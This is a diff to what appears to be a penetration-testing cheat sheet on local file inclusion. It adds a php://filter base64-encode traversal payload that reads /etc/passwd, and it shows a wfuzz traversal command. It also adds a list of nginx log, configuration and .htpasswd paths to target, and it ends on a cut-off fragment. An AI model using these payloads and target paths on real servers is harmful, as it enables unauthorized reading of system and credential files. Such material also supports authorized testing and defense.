@@ -397,6 +397,12 @@ cat url.txt|gf lfi |tee a.txt
 ```
 wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
 ```
+>advance bypass
+```
+url=exam.com/?u=dog
+to 
+php://filter/convert.base64-encode/resource=dog/../../../etc/passwd
+```
 >[lfi scan ](https://github.com/halohashm79/lfi-scan)
 ```
 python lfi.py
@@ -495,7 +501,31 @@ C:/Windows/system32/sysprep
 C:/Inetpub/wwwroot/
 
 C:/Inetpub/wwwroot/web.config
+I Ngnix
 
+/var/log/nginx/access.log
+
+/var/log/nginx/error.log
+
+/etc/nginx/nginx.conf /etc/nginx/conf.d/.htpasswd
+
+/etc/nginx/conf.d/example.com.conf
+
+/etc/nginx/conf.d/example.conf
+
+/etc/nginx/conf.d/subdomain.example.com.conf
+
+/etc/nginx/conf.d/subdomain.conf
+
+/etc/nginx/sites-available/example.com.conf
+
+/etc/nginx/sites-enabled/default
+
+/etc/nginx/sites-enabled/example.com.conf
+
+/usr/local/nginx/conf/nginx.conf /usr/local/etc/nginx/nginx.conf
+
+#PHP web cont (x.x is specified PHP
 ```
 
 >next way
